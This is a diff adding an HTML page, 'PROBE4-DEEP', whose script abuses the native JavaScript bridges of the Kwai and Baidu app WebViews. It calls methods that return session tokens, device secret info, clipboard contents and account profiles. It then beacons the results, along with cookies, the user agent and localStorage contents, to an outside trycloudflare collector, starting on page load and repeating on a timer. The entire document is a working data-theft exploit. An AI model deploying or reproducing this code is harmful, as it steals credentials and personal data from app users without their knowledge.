@@ -1,0 +1,77 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>P4</title>
+<style>body{font-family:monospace;font-size:12px;word-break:break-all;margin:4px;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:10px}h1{color:#ff0;font-size:18px;margin:2px 0}</style>
+</head>
+<body>
+<h1>PROBE4-DEEP</h1>
+<pre id="out">boot...</pre>
+<script>
+var COLLECTOR = 'https://waters-finances-wrestling-marked.trycloudflare.com';
+var LOG = [], seq = 0;
+function out(s){ LOG.push('['+(seq++)+'] '+String(s)); document.getElementById('out').textContent = LOG.join('\n').substring(0,3000); }
+function report(tag, data){
+  var p = {page:'probe4', tag:tag, url:location.href, data:data, ck:document.cookie, ua:navigator.userAgent};
+  var qs = encodeURIComponent(JSON.stringify(p));
+  try{ navigator.sendBeacon(COLLECTOR+'/b?d='+qs); }catch(e){}
+}
+function safe(fn, name){ try{ return fn(); }catch(e){ out('ERR '+name+': '+e); return undefined; } }
+
+function kwaiCalls(){
+  var K = window.Kwai; if (!K) { out('no Kwai'); return; }
+  ['getSidToken','getDeviceInfo','getDeviceSecretInfo','getAppEnvironment','getClientLogInfo','getClipBoard','getABTest'].forEach(function(m){
+    if (typeof K[m] !== 'function'){ out(m+' not fn'); return; }
+    // signature 1: callback arg
+    safe(function(){ var r = K[m](function(x){ out(m+'(cb): '+JSON.stringify(x).substring(0,500)); }); if (r!==undefined&&r!==null){ out(m+'(cb)sync-ret: '+String(r).substring(0,300)); } }, m+'-s1');
+    // signature 2: plain call no args
+    safe(function(){ var r = K[m](); if (r!==undefined&&r!==null){ out(m+'(): '+String(r).substring(0,500)); report('kwai-call-'+m, String(r).substring(0,2000)); } }, m+'-s2');
+  });
+  // yoda invoke variants
+  var y = window.__yodaBridge__;
+  if (y){
+    [['user','getUserInfo'],['common','getCommonParameters'],['device','getDeviceInfo'],['app','getAppInfo'],['kpf','getKpfInfo']].forEach(function(p){
+      safe(function(){ y.invoke(p[0]+'.'+p[1], {}, function(res){ out('yoda '+p[0]+'.'+p[1]+': '+JSON.stringify(res).substring(0,500)); report('yoda4-'+p[0]+'.'+p[1], res); }); }, 'yoda4-'+p[1]);
+    });
+    // raw names as-is
+    ['getSidToken','getUserInfo','getCommonParameters'].forEach(function(api){
+      safe(function(){ y.invoke(api, {}, function(res){ out('yoda raw '+api+': '+JSON.stringify(res).substring(0,500)); report('yoda4r-'+api, res); }); }, 'yoda4r');
+    });
+  }
+}
+function baiduCalls(){
+  var jb = window.Bdbox_android_jsbridge;
+  // dispatch signature variants
+  var tries = [
+    ['Bdbox_android_utils','getDeviceInfo'],
+    ['Bdbox_android_account','profile'],
+    ['account','getInfo'],
+    ['Bdbox_android_feed','getContextInfo'],
+  ];
+  tries.forEach(function(t){
+    if (jb && jb.dispatch){
+      safe(function(){ jb.dispatch(t[0], t[1], {}, function(x){ out('dsp '+t[0]+'.'+t[1]+' v1: '+JSON.stringify(x).substring(0,500)); report('bd4-d1-'+t[0]+'.'+t[1], x); }); }, 'd1');
+      safe(function(){ jb.dispatch(t[0]+':'+t[1], {}, function(x){ out('dsp '+t[0]+':'+t[1]+' v2: '+JSON.stringify(x).substring(0,500)); report('bd4-d2-'+t[0], x); }); }, 'd2');
+    }
+  });
+  // direct property read again (post-login)
+  safe(function(){ var a=window.Bdbox_android_account; out('acc keys: '+Object.keys(a||{}).join(',')); if (a && a.profile){ var s = typeof a.profile==='function'? String(a.profile()) : JSON.stringify(a.profile); out('profile: '+s.substring(0,400)); report('bd4-profile', s.substring(0,2000)); } }, 'acc2');
+  safe(function(){ var u=window.Bdbox_android_utils; if(u&&u.currPageUrl){ var r=u.currPageUrl(function(x){out('currPageUrl cb '+JSON.stringify(x).substring(0,300))}); if(r)out('currPageUrl sync '+String(r).substring(0,300)); } }, 'cpu');
+}
+
+var fired=false;
+function go(){ if(fired) return; fired=true; out('ready-go '+document.readyState); setTimeout(function(){ out('cookie: '+(document.cookie||'(none)')); kwaiCalls(); baiduCalls(); out('calls fired'); }, 600); }
+document.addEventListener('WebViewJavascriptBridgeReady', function(){ out('ev: WVJSBReady'); go(); }, false);
+document.addEventListener('KwaiWebViewJavascriptBridgeReady', function(){ out('ev: KwaiReady'); go(); }, false);
+window.addEventListener('message', function(e){ out('win-msg: '+String(e.data).substring(0,200)); }, false);
+setTimeout(go, 5000); // fallback
+
+// rolling reports to catch late async callbacks
+var n = 0;
+var iv = setInterval(function(){
+  n++;
+  report('roll-'+n, {log: LOG.slice(0,100), ls: safe(function(){var a=[];for(var i=0;i<localStorage.length;i++)a.push(localStorage.key(i)+'='+String(localStorage.getItem(localStorage.key(i))).substring(0,80));return a;}, 'ls')||[]});
+  if (n >= 6) clearInterval(iv);
+}, 5000);
+</script>
+</body>
+</html>
